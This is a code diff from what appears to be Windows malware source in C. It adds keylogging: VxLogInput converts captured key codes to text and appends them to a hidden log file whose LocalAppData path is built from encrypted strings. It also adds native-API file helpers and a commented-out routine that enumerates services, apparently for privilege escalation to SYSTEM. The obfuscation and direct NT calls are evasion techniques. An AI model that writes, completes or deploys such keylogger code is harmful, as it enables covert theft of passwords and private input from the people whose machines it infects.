@@ -332,7 +332,7 @@ DWORD VxGetLastError(VOID)
 	return Teb->LastErrorValue;
 }
 
-BOOL VxCreateDataFile(PAPI_TABLE Api)
+HANDLE VxCreateDataFile(PAPI_TABLE Api)
 {
 	LPVOID Buffer = NULL;
 	LPVOID DecodedString = NULL;
@@ -341,8 +341,11 @@ BOOL VxCreateDataFile(PAPI_TABLE Api)
 	IO_STATUS_BLOCK Io; VxZeroMemory(&Io, sizeof(IO_STATUS_BLOCK));
 	OBJECT_ATTRIBUTES Attributes; VxZeroMemory(&Attributes, sizeof(OBJECT_ATTRIBUTES));
 	UNICODE_STRING uString; VxZeroMemory(&uString, sizeof(UNICODE_STRING));
+	UNICODE_STRING NtPath; VxZeroMemory(&NtPath, sizeof(UNICODE_STRING));
 	PUNICODE_STRING Key = VxGetPassword();
 	PPEB Peb = RtlGetPeb();
+	LARGE_INTEGER Integer; VxZeroMemory(&Integer, sizeof(LARGE_INTEGER)); Integer.QuadPart = 2048;
+	HANDLE hLog;
 
 	Buffer = Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, MAX_PATH);
 	if (Buffer == NULL)
@@ -355,6 +358,33 @@ BOOL VxCreateDataFile(PAPI_TABLE Api)
 	VxDecrypt64(Key->Buffer, LocalAppData, 12, (PWCHAR)DecodedString);
 	if (VxGetEnvironmentVariableW(Api, (LPCWSTR)DecodedString, (LPWSTR)Buffer, MAX_PATH) == 0)
 		goto FAILURE;
+	else {
+		VxZeroMemory(DecodedString, MAX_PATH);
+		VxDecrypt64(Key->Buffer, FileFormat, 4, (PWCHAR)DecodedString);
+		VxStringConcatW((PWCHAR)Buffer, L"\\");
+		VxStringConcatW((PWCHAR)Buffer, (PWCHAR)Api->FileNames.g_szFileName);
+		VxStringConcatW((PWCHAR)Buffer, (PWCHAR)DecodedString);
+
+		Api->RtlInitUnicodeString(&uString, (PWCHAR)Buffer);
+
+		if (uString.Buffer[0] != L'\\')
+			Api->RtlDosPathNameToNtPathName_U(uString.Buffer, &NtPath, NULL, NULL);
+
+		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, DecodedString);
+	}
+
+	InitializeObjectAttributes(&Attributes, &NtPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+	if (Api->NtCreateFile(&hLog, FILE_GENERIC_WRITE | FILE_GENERIC_READ, &Attributes, &Io, &Integer, FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_READ, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, 0, 0) != ERROR_SUCCESS)
+	{
+		goto FAILURE;
+	}
+
+	if (VxSetFilePointer(Api, hLog, 0, NULL, FILE_END) == INVALID_SET_FILE_POINTER)
+		goto FAILURE;
+
+	return hLog;
 
 FAILURE:
 
@@ -364,7 +394,7 @@ FAILURE:
 	if (DecodedString)
 		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, DecodedString);
 
-	return FALSE;
+	return NULL;
 
 }
 
@@ -382,6 +412,8 @@ DWORD VxGetEnvironmentVariableW(PAPI_TABLE Api, LPCWSTR Name, LPWSTR lpBuffer, D
 	String = (LPWSTR)Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, sizeof(WCHAR) * 2);
 	VxDecimalToAsciiW(String, Token, 1);
 
+	Name = VxCapString((PWCHAR)Name);
+
 	if (Name != NULL)
 		Api->RtlInitUnicodeString(&Variable, (PWCHAR)Name);
 
@@ -389,7 +421,8 @@ DWORD VxGetEnvironmentVariableW(PAPI_TABLE Api, LPCWSTR Name, LPWSTR lpBuffer, D
 	{
 		lpszPtr += VxStringLength(lpszPtr) + 1;
 		Pointer = VxStringTokenW(lpszPtr, String);
-		Pointer = VxCapString(Pointer);
+		if (Pointer != NULL)
+			Pointer = VxCapString(Pointer);
 
 		if (VxStringCompare(lpszPtr, Variable.Buffer) == ERROR_SUCCESS)
 		{
@@ -403,7 +436,230 @@ DWORD VxGetEnvironmentVariableW(PAPI_TABLE Api, LPCWSTR Name, LPWSTR lpBuffer, D
 		}
 	}
 
-	Api->RtlFreeUnicodeString(&Variable);
 	Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, String);
 
+	VxSecureStringCopy(lpBuffer, uString.Buffer, uString.Length);
+
+	return uString.Length;
 }
+
+DWORD VxSetFilePointer(PAPI_TABLE Api, HANDLE hFile, LONG lpDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
+{
+	FILE_POSITION_INFORMATION FilePosition;
+	FILE_STANDARD_INFORMATION FileStandard;
+	NTSTATUS Status;
+	IO_STATUS_BLOCK Block;
+	LARGE_INTEGER Distance;
+
+	if (((ULONG_PTR)hFile & 0x10000003) == 0x3)
+		return INVALID_SET_FILE_POINTER;
+
+	if (lpDistanceToMoveHigh)
+	{
+		Distance.u.HighPart = *lpDistanceToMoveHigh;
+		Distance.u.LowPart = lpDistanceToMove;
+	}
+	else
+		Distance.QuadPart = lpDistanceToMove;
+
+	switch (dwMoveMethod)
+	{
+		case FILE_CURRENT:
+		{
+			Status = Api->NtQueryInformationFile(hFile, &Block, &FilePosition, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation);
+			FilePosition.CurrentByteOffset.QuadPart += Distance.QuadPart;
+
+			if (Status != 0x00000000)
+				goto FAILURE;
+
+			break;
+		}
+		case FILE_END:
+		{
+			Status = Api->NtQueryInformationFile(hFile, &Block, &FileStandard, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
+			FilePosition.CurrentByteOffset.QuadPart = FileStandard.EndOfFile.QuadPart + Distance.QuadPart;
+
+			if (Status != 0x00000000)
+				goto FAILURE;
+
+			break;
+		}
+		case FILE_BEGIN:
+		{
+			FilePosition.CurrentByteOffset.QuadPart = Distance.QuadPart;
+			break;
+		}
+
+		default:
+			goto FAILURE;
+	}
+
+	if (FilePosition.CurrentByteOffset.QuadPart < ERROR_SUCCESS)
+		return INVALID_SET_FILE_POINTER;
+
+	if (lpDistanceToMoveHigh == NULL && FilePosition.CurrentByteOffset.HighPart != 0)
+		return INVALID_SET_FILE_POINTER;
+
+	if (Api->NtSetInformationFile(hFile, &Block, &FilePosition, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation) != 0x00000000)
+		goto FAILURE;
+	else {
+		if (lpDistanceToMoveHigh != NULL)
+			*lpDistanceToMoveHigh = FilePosition.CurrentByteOffset.u.HighPart;
+	}
+
+	return FilePosition.CurrentByteOffset.u.LowPart;
+
+FAILURE:
+
+	if (lpDistanceToMoveHigh != NULL)
+		*lpDistanceToMoveHigh = -1;
+
+	return INVALID_SET_FILE_POINTER;
+}
+
+BOOL VxLogInput(PAPI_TABLE Api, HANDLE hLog, UINT Key)
+{
+	IO_STATUS_BLOCK Block; VxZeroMemory(&Block, sizeof(IO_STATUS_BLOCK));
+	LPWSTR DynamicStrings = NULL;
+	PPEB Peb = RtlGetPeb();
+	BYTE pByte[256]; VxZeroMemory(pByte, 256);
+	WCHAR szKey[32], pBuffer[32] = { 0 };
+	WORD wKey;
+	DWORD dwLength = 0, BracketL = 91, BracketR = 93;
+	PUNICODE_STRING uKey = VxGetPassword();
+
+	WCHAR BackSpace[5] = { 0x18, 0x78, 0x0c, 0x0a, 0x00 };
+	WCHAR NewLine[3] = { 0x1f, 0x54, 0x00 };
+	WCHAR Shift[5] = { 0x18, 0x69, 0x14, 0x0a, 0x00 };
+
+	DynamicStrings = (LPWSTR)Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, MAX_PATH);
+	if (DynamicStrings == NULL)
+		return FALSE;
+
+	Api->vxGetKeyState(VK_CAPITAL);
+	Api->vxGetKeyState(VK_SCROLL);
+	Api->vxGetKeyState(VK_NUMLOCK);
+
+	Api->vxGetKeyboardState(pByte);
+
+	dwLength = ERROR_SUCCESS;
+	switch (Key)
+	{
+		case VK_BACK:
+		{
+			VxDecrypt64(uKey->Buffer, BackSpace, 4, DynamicStrings);
+			VxStringCopyW(pBuffer, DynamicStrings);
+			dwLength = (DWORD)VxStringLength(pBuffer);
+			Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, DynamicStrings);
+
+			break;
+		}
+		case VK_RETURN:
+		{
+			VxDecrypt64(uKey->Buffer, NewLine, 2, DynamicStrings);
+			VxStringCopyW(pBuffer, DynamicStrings);
+			dwLength = (DWORD)VxStringLength(pBuffer);
+			Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, DynamicStrings);
+
+			break;
+		}
+		case VK_SHIFT:
+		{
+			VxDecrypt64(uKey->Buffer, Shift, 4, DynamicStrings);
+			VxStringCopyW(pBuffer, DynamicStrings);
+			dwLength = (DWORD)VxStringLength(pBuffer);
+			Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, DynamicStrings);
+
+			break;
+		}
+		default:
+		{
+			if (Api->vxToAscii(Key, Api->vxMapVirtualKey(Key, 0), pByte, &wKey, 0) == 1) //does mapvirtualkey wrap to ex?
+			{
+				pBuffer[0] = (CHAR)wKey; pBuffer[1] = '\0';
+				dwLength = (DWORD)VxStringLength(pBuffer);
+			}
+			else if (Api->vxGetKeyNameTextW(MAKELONG(0, Api->vxMapVirtualKey(Key, 0)), szKey, 32) > 0)
+			{
+				VxSecureStringCopy(pBuffer, szKey, VxStringLength(szKey));
+				dwLength = (DWORD)VxStringLength(pBuffer);
+				pBuffer[dwLength++] = '\0';
+			}
+			break;
+		}
+	}
+
+	if (dwLength > 0)
+	{
+		if (Api->NtWriteFile(hLog, NULL, NULL, NULL, &Block, pBuffer, (DWORD)VxStringLength(pBuffer) * sizeof(WCHAR), NULL, NULL) != ERROR_SUCCESS)
+			return FALSE;
+	}
+
+	return TRUE;
+}
+/*
+BOOL VxEscalateToSystemEx(PAPI_TABLE Api)
+{
+	SC_HANDLE ServiceHandle;
+	ENUM_SERVICE_STATUS_PROCESSW *Services;
+	PBYTE pData = NULL;
+	DWORD dwNeeded = 0, dwServices = 0, dwX = 0;
+	PPEB Peb = RtlGetPeb();
+	SERVICE_STATUS ServiceStatus;
+	SC_HANDLE hHandle;
+
+	ServiceHandle = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (ServiceHandle == NULL)
+		goto FAILURE;
+
+	EnumServicesStatusExW(ServiceHandle, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &dwNeeded, &dwServices, NULL, NULL);
+	if (VxGetLastError() != 0xea)
+		goto FAILURE;
+
+	pData = (PBYTE)Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, (SIZE_T)dwNeeded);
+	if (pData == NULL)
+		goto FAILURE;
+
+	if (!EnumServicesStatusExW(ServiceHandle, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, pData, dwNeeded, &dwNeeded, &dwServices, NULL, NULL))
+		goto FAILURE;
+	else
+		Services = (ENUM_SERVICE_STATUS_PROCESS*)pData;
+
+	for (; dwX < dwServices; dwX++)
+	{
+		hHandle = OpenService(ServiceHandle, Services[dwX].lpServiceName, SC_MANAGER_ALL_ACCESS);
+		if (hHandle == NULL)
+			continue;
+		
+		if (QueryServiceStatus(hHandle, &ServiceStatus))
+		{
+			if (ServiceStatus.dwCurrentState == SERVICE_STOPPED)
+				OutputDebugStringW(Services[dwX].lpServiceName);
+		}
+
+		CloseServiceHandle(hHandle);
+		VxZeroMemory(&ServiceStatus, sizeof(ServiceStatus));
+
+	}
+
+
+	if (pData)
+		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, pData);
+
+	if (ServiceHandle)
+		CloseServiceHandle(ServiceHandle);
+
+	return TRUE;
+
+FAILURE:
+
+	if (pData)
+		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, pData);
+
+	if (ServiceHandle)
+		CloseServiceHandle(ServiceHandle);
+
+	return FALSE;
+
+}
+*/
